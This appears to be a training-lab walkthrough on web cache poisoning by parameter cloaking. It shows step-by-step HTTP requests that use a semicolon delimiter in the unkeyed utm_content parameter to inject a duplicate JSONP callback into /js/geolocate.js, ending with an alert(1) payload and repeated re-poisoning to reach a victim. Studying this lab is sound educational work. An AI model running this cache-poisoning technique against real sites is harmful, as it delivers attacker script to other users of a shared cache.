# Lab 09 — Parameter Cloaking

## Objective

Use inconsistent parameter parsing to poison the cache with `alert(1)`.

## Step 1 — Find the excluded parameter

Identify:

```text
utm_content
```

and confirm that it is excluded from the cache key.

## Step 2 — Exploit delimiter discrepancy

Append another parameter using a semicolon:

```text
utm_content=foo;callback=arbitraryFunction
```

The source explains that the cache treats this as part of the excluded parameter while the back-end can interpret it as a separate parameter.

## Step 3 — Find a useful gadget

Every page imports:

```text
/js/geolocate.js
```

with:

```text
callback=setCountryCookie
```

Send:

```text
GET /js/geolocate.js?callback=setCountryCookie
```

to Repeater.

The callback parameter controls the function called on the returned data.

## Step 4 — Confirm cache-key behavior

Use:

```text
GET /js/geolocate.js?callback=setCountryCookie&utm_content=foo;callback=arbitraryFunction
```

The source shows a cache key resembling:

```text
X-Cache-Key: /js/geolocate.js?callback=setCountryCookie
```

while the response contains:

```javascript
arbitraryFunction({"country" : "United Kingdom"})
```

## Step 5 — Execute the lab payload

Use:

```text
GET /js/geolocate.js?callback=setCountryCookie&utm_content=foo;callback=alert(1)
```

Cache the response and load the home page.

Continue re-poisoning until the victim loads the affected resource.

## Key Learning

The cache and application disagree about parameter delimiters, allowing an excluded parameter to cloak an attacker-controlled duplicate of a keyed parameter.
